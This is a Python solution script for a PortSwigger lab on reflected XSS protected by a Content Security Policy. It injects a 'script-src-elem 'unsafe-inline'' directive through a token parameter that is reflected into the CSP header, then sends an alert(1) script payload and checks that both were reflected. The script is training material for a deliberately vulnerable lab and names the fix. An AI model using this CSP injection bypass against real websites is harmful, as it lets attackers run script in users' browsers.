# Lab 30 — Reflected XSS protected by CSP, with CSP bypass
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
#
# Vulnerability: Search — reflected XSS blocked by CSP, but CSP header is injectable
# Aim:           Bypass CSP by injecting a new directive, then call alert
#
# Note: The intended solution is Chrome-only. Use Chrome for this lab.
#
# Technique:
#   CSP header: ...report-uri /csp-report?token=VALUE
#   The token parameter is reflected directly into the CSP header string.
#
#   Inject a new CSP directive by appending it after a semicolon:
#     token = ;script-src-elem 'unsafe-inline'
#
#   Resulting CSP header:
#     ...report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
#
#   The semicolon terminates report-uri and starts a new directive.
#   script-src-elem is more specific than script-src → overrides it in Chrome.
#   'unsafe-inline' allows inline <script> tags → our XSS payload now runs.
#
#   Full URL:
#     /?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
#
#   This is CSP header injection — a class related to HTTP response header injection.
#   The fix is simple: never reflect user input into response headers.
#
# Usage: python xss_lab30.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

XSS_PAYLOAD = "<script>alert(1)</script>"
CSP_INJECT  = ";script-src-elem 'unsafe-inline'"

if __name__ == "__main__":
    banner()
    section("LAB 30 — REFLECTED XSS: CSP HEADER INJECTION BYPASS (Chrome only)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab30.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    params = {"search": XSS_PAYLOAD, "token": CSP_INJECT}

    print(f"  ➜  XSS payload: {XSS_PAYLOAD}")
    print(f"  ➜  CSP injection: token={CSP_INJECT}\n")
    r = session.get(url, params=params)

    # Verify the XSS payload is reflected raw in the body
    print("  ─── Checking XSS payload reflection:")
    check_reflection(r.text, XSS_PAYLOAD, "XSS payload")

    # Verify the CSP header was injected
    print("\n  ─── Checking CSP header injection:")
    csp_header = r.headers.get("Content-Security-Policy", "")
    if "script-src-elem" in csp_header and "unsafe-inline" in csp_header:
        print("  ✔  script-src-elem 'unsafe-inline' injected into CSP header")
        print(f"     CSP: {csp_header}")
    else:
        print("  ✘  CSP injection not confirmed in response headers")
        print(f"     CSP: {csp_header}")

    print()
    print("  ➜  Open this URL in Chrome (Chrome only — directive precedence needed):")
    print(f"     {r.url}")
    print()
    print("  ℹ  script-src-elem overrides script-src in Chrome → 'unsafe-inline' allowed.")
    print("     The XSS payload was already reflected — CSP was the only thing blocking it.")
